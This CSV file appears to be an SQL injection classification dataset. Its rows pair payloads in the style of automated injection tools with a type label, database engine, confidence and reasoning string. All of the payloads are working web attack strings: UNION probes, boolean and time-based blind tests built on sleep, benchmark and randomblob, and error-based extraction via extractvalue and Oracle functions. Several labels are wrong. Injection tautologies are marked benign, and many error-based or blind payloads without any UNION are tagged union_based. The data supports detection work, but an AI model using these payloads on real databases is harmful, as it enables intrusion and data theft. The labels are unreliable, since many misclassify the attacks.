id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1840,"-9337 ) union all select 5648,5648,5648,5648,5648#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
1841,"-2734' ) union all select 5510,5510,5510,5510,5510#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
1842,"-7559"" or 8792 = 6905--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
1847,"-7945%' ) ) ) union all select 4286,4286,4286,4286,4286,4286--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
1848,"-5998%"" ) union all select 2366,2366,2366,2366#",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
1849,"-6129 union all select 9122,9122#",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
1852,"1 ) where 7600 = 7600 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
1853,"-5945' ) ) ) union all select 4266,4266,4266,4266,4266--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
1855,"-2701"" ) ) as wvht where 5401 = 5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",union_based,generic,0.7,UNION-based payload detected. Payload length: 94 chars.,2
1861,-6890' ) ) or 5771 = 7721--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
1869,"1%"" ) and 8715 = 5529",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
1870,"1 ) ) ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
1871,"1 ) where 3076 = 3076 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
1878,"1'|| ( select 'xhqy' where 4531 = 4531 union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
1880,"-6667%"" ) ) union all select 7348,7348,7348,7348,7348,7348,7348,7348#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
1882,"1' ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
1883,"-8319"" ) ) or 7878 = 5970 and ( ( ""jcaz"" like ""jcaz",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
1886,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
1891,"1"" where 9973 = 9973 and 2006 = 2006",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,2
1892,"-3954' ) ) union all select 2417,2417--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
1893,"1' ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
1895,"-6593"" ) union all select 6216,6216,6216,6216,6216,6216,6216#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
1897,1' ) and 7290 = 8416 and ( 'ktlz' like 'ktlz,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
1898,"-8472' ) where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,2
1899,"1"" ) where 9770 = 9770 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
1900,"1'+ ( select ocvc where 6981 = 6981 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 103 chars.,2
1901,"1 ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
1902,"-6214"" union all select 3323,3323#",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
1903,-7979'+ ( select 'bkvt' where 3613 = 3613 union all select 3613#,union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
1906,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
1907,"1%"" ) union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
1910,"-2085"" ) as hkev where 7730 = 7730 union all select 7730,7730--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
1914,"1%' union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
1916,"-7868' in boolean mode ) union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
1917,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
1918,"-6093' ) where 9676 = 9676 union all select 9676,9676,9676,9676,9676,9676--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
1919,-2891 where 1770 = 1770 or 9290 = 5866,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
1920,"-3562"" ) as eghl where 7094 = 7094 union all select 7094,7094,7094,7094#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
1921,"1'+ ( select rqcw where 9002 = 9002 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 98 chars.,2
1922,"1' ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
1929,"1"" ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
1931,"1"" where 8241 = 8241 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
1932,"-8841%"" ) or 4361 = 1910",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
1933,"1%"" and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
1934,"-5509%"" ) ) ) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
1936,"1'+ ( select cjcp where 2590 = 2590 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
1939,-6310 or 6715 = 3399,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
1943,"1%"" and 6408 = 7959--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
1948,"1"" ) as hfvz where 7186 = 7186 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
1949,"-3461"" ) ) union all select 6342,6342,6342,6342,6342,6342#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
1950,-5134 ) ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
1961,1' where 8770 = 8770 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
1964,"-3666"" ) ) ) union all select 4136,4136,4136--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
1966,"-3037 ) where 9024 = 9024 union all select 9024,9024--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
1967,"1 ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
1968,-2452' ) ) ) union all select 1951--,union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
1969,"1' ) as ghks where 5128 = 5128 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 98 chars.,2
1974,"1"" ) ) as maxe where 5883 = 5883 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 95 chars.,2
1975,1' ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 28 chars.,2
1976,"-3379 ) union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
1977,"1 ) ) as oqfr where 6426 = 6426 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 68 chars.,2
1979,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
1985,"-7469 ) where 5875 = 5875 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,2
1986,-6755 ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
1988,"1'+ ( select yfuu where 1717 = 1717 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 99 chars.,2
1989,"1"" ) where 2657 = 2657 and 5309 = 7592--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
1990,1 ) and 3659 = 5475 and ( 8949 = 8949,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
1998,"-2048 ) ) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
1999,"1"" where 6347 = 6347 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
1808,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'szib' like 'szib",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
1826,"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 9112 = 9112",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1832,"1' where 4149 = 4149 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1851,"1"" ) ) rlike sleep ( 5 ) and ( ( ""ahhx"" like ""ahhx",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
1859,1 ) ) as ewlg where 3722 = 3722 rlike sleep ( 5 ) --,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
1885,"1%"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1930,"1"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""whld"" = ""whld",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
1940,"1"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""vkqt"" = ""vkqt",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1980,"1"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1982,"1"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""yrgy"" like ""yrgy",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1997,"1%"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """,time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1813,"1' ) ) ) and elt ( 9501 = 8427,8427 ) and ( ( ( 'ahpp' = 'ahpp",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1857,"-9688%' ) ) ) or elt ( 3695 = 7995,7995 ) and ( ( ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1858,"1 ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 8671 = 8671",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1864,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""vxec"" like ""vxec",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1865,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'eznq' like 'eznq",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1874,"1"" ) ) as ydkd where 2455 = 2455 and sleep ( 5 ) --",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1876,1' or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1888,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'hmqq' = 'hmqq",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1944,1' and sleep ( 5 ),time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1875,"-4148%"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 56 chars.,1
1879,"-6746"" ) or ( 8459 = 8459 ) *4906 and ( ""kohi"" like ""kohi",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 57 chars.,1
1896,"1"" ) and make_set ( 4539 = 6401,6401 ) and ( ""kglx"" = ""kglx",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,1
1915,-1375' ) ) ) or ( 1226 = 9648 ) *9648 and ( ( ( 'kfoy' like 'kfoy,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 65 chars.,1
1924,-9225 ) or ( 8258 = 2726 ) *2726 and ( 9900 = 9900,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,1
1937,"1' and make_set ( 8403 = 8403,8899 )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,1
1971,-9556 or ( 2049 = 6967 ) *6967# mhbc,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,1
1981,"-5062"" ) ) ) or ( 1069 = 8974 ) *8974 and ( ( ( ""hsge"" = ""hsge",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
1994,"-7806"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""vlrj"" like ""vlrj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,1
1834,1 where 2382 = 2382,benign,generic,0.5,. Payload length: 19 chars.,1
1837,1 where 9404 = 9404,benign,generic,0.5,. Payload length: 19 chars.,1
1838,1' ) where 7252 = 7252,benign,generic,0.5,. Payload length: 22 chars.,1
1839,1 ) as nsdy where 7513 = 7513,benign,generic,0.5,. Payload length: 29 chars.,1
1854,"1"" ) as rcnk where 1800 = 1800",benign,generic,0.5,. Payload length: 30 chars.,1
1867,1 ) as usnn where 3201 = 3201,benign,generic,0.5,. Payload length: 29 chars.,1
1890,1' ) where 4729 = 4729,benign,generic,0.5,. Payload length: 22 chars.,1
1912,1 where 8398 = 8398,benign,generic,0.5,. Payload length: 19 chars.,1
1923,"1"" ) where 3679 = 3679",benign,generic,0.5,. Payload length: 22 chars.,1
1926,1' where 8099 = 8099,benign,generic,0.5,. Payload length: 20 chars.,1
1960,1' ) where 2763 = 2763,benign,generic,0.5,. Payload length: 22 chars.,1
1984,1' where 4388 = 4388,benign,generic,0.5,. Payload length: 20 chars.,1
1800,"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""hrkf"" like ""hrkf",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
1804,"-4015"" where 2610 = 2610 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
1805,"1 ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
1811,"1 ) where 1013 = 1013 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
1817,"-5798"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
1822,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""exgr"" like ""exgr",union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
1836,select ( case when ( 7997 = 1543 ) then 7997 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
1845,"-2612"" ) as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
1846,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
1850,"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'qfvg' = 'qfvg",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
1860,( select 2412 = ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ),union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
1862,"1"" ) where 4739 = 4739 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
1863,"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
1868,select ( case when ( 9816 = 1693 ) then 9816 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
1872,"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""liar"" = ""liar",union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
1877,-7239' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'cswv' = 'cswv,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
1909,"1%"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""%"" = """,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
